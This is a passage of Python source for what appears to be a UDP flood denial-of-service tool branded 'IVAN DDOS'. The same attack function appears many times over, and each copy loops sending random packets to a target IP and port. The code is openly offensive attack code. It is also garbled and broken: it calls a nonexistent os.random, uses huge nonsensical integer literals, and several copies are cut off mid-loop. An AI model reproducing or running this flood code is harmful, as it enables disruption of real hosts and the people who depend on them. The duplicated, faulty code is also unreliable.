    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
